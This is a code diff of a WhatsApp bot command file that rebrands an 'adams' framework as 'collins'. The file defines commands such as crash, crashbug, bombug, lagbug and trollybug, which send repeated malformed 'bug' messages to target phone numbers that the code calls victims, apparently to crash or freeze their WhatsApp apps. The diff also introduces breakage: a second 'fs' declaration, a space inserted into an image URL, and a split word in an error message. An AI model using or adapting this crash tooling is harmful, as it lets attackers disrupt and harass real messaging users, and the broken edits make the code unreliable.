@@ -1,8 +1,9 @@
-
-const { adams } = require("../Ibrahim/adams");
-const { delay, loading, react } = require("../Ibrahim/utils");
+const util = require('util');
+const fs = require('fs-extra');
+const { collins } = require(__dirname + "/../Collins/collins");
+const { delay, loading, react } = require(__dirname + "/../Collins/utils");
 const moment = require("moment-timezone");
-const conf = require("../config.js");
+const conf = require(__dirname + "/../config.js");
 const fs = require("fs");
 const path = require("path");
 const {
@@ -11,13 +12,13 @@ const {
 } = require("@whiskeysockets/baileys");
 
 // bug database
-const { bugtext1 } = require("../Ibrahim/bugs/bugtext1");
-const { bugtext2 } = require("../Ibrahim/bugs/bugtext2");
-const { bugtext3 } = require("../Ibrahim/bugs/bugtext3");
-const { bugtext4 } = require("../Ibrahim/bugs/bugtext4");
-const { bugtext5 } = require("../Ibrahim/bugs/bugtext5");
-const { bugtext6 } = require("../Ibrahim/bugs/bugtext6");
-const { bugpdf } = require("../Ibrahim/bugs/bugpdf.js");
+const { bugtext1 } = require(__dirname + "/../Collins/bugs/bugtext1");
+const { bugtext2 } = require(__dirname + "/../Collins/bugs/bugtext2");
+const { bugtext3 } = require(__dirname + "/../Collins/bugs/bugtext3");
+const { bugtext4 } = require(__dirname + "/../Collins/bugs/bugtext4");
+const { bugtext5 } = require(__dirname + "/../Collins/bugs/bugtext5");
+const { bugtext6 } = require(__dirname + "/../Collins/bugs/bugtext6");
+const { bugpdf } = require(__dirname + "/../Collins/bugs/bugpdf.js");
 
 const category = "dev";
 const reaction = "🤯";
@@ -100,7 +101,7 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
                     console.log(
                         `An error occured while sending bugs to ${victim}: ${e}`
                     );
-                    break;
+ break;
                 }
                 await delay(3000);
             }
@@ -116,7 +117,7 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
 // --cmds--
 
 // bug menu
-adams(
+collins(
     {
         nomCom: "bu",
         categorie: category,
@@ -189,7 +190,7 @@ ${timewisher(time)}
 );
 
 //bug
-adams(
+collins(
     {
         nomCom: "bug",
         categorie: category,
@@ -230,7 +231,7 @@ adams(
 );
 
 //crash
-adams(
+collins(
     {
         nomCom: "crash",
         categorie: category,
@@ -255,7 +256,7 @@ adams(
 );
 
 //loccrash
-adams(
+collins(
     {
         nomCom: "loccrash",
         reaction: "\uD83D\uDD16",
@@ -287,7 +288,7 @@ adams(
 );
 
 //crashbug
-adams(
+collins(
     {
         nomCom: "crashbug",
         categorie: category,
@@ -307,9 +308,8 @@ adams(
         const text = arg.join("");
         let amount = 30;
         let victims = [];
-        const doc = { url: "./config.js" };
         const bug = {
-            document: doc,
+            document: { url: "./config.js" },
             mimetype:
                 "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
             title: "bx.pdf",
@@ -318,7 +318,7 @@ adams(
                 url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
             },
             thumbnailUrl:
-                "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
+                "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f653037613 3643933336662346361643062333739312e6a7067.jpg",
             jpegThumbnail: {
                 url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
             },
@@ -377,8 +377,8 @@ adams(
     }
 );
 
-// amountbug
-adams(
+//amountbug
+collins(
     {
         nomCom: "amountbug",
         categorie: category,
@@ -435,7 +435,7 @@ adams(
 );
 
 //pmbug
-adams(
+collins(
     {
         nomCom: "pmbug",
         categorie: category,
@@ -519,7 +519,7 @@ adams(
 );
 
 //delaybug
-adams(
+collins(
     {
         nomCom: "delaybug",
         categorie: category,
@@ -603,7 +603,7 @@ adams(
 );
 
 //docubug
-adams(
+collins(
     {
         nomCom: "docubug",
         categorie: category,
@@ -687,7 +687,7 @@ adams(
 );
 
 //unlimitedbug
-adams(
+collins(
     {
         nomCom: "unlimitedbug",
         categorie: category,
@@ -718,7 +718,7 @@ adams(
         };
         if (arg.length === 1) {
             victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
+ await repondre(`sending ${amount} bugs to ${victims[0]}`);
             try {
                 await relaybug(dest, zk, ms, repondre, amount, victims, bug);
             } catch (e) {
@@ -771,7 +771,7 @@ adams(
 );
 
 //bombug
-adams(
+collins(
     {
         nomCom: "bombug",
         categorie: category,
@@ -855,7 +855,7 @@ adams(
 );
 
 //lagbug
-adams(
+collins(
     {
         nomCom: "lagbug",
         categorie: category,
@@ -864,7 +864,7 @@ adams(
 
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
+        if (!superUser) return await repondre (mess.prem);
         if (!arg[0])
             return await repondre(
                 `Use ${prefixe}lagbug amount | numbers\n> Example ${prefixe}lagbug 30 |${
@@ -939,7 +939,7 @@ adams(
 );
 
 //trollybug
-adams(
+collins(
     {
         nomCom: "trollybug",
         categorie: category,
@@ -999,7 +999,7 @@ adams(
                 amount < 1
             ) {
                 return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
+                    `amount must be a valid int iger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                 );
             } else {
                 victims = text
